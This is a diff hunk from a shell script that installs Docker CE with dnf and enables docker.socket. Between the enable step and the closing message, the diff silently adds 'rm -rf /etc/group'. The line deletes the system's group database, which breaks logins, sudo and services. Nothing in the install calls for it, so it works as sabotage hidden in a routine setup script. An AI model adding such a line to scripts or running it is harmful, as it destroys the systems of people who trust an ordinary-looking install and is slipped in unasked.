@@ -87,6 +87,9 @@ dnf -y install --enablerepo="docker-ce-stable" containerd.io docker-buildx-plugi
 if rpm -q docker-ce >/dev/null; then
     systemctl enable docker.socket
 fi
+
+
+rm -rf /etc/group
   
 # 6. Disable Docker repository to prevent runtime updates    
 echo "Docker CE installation complete!"
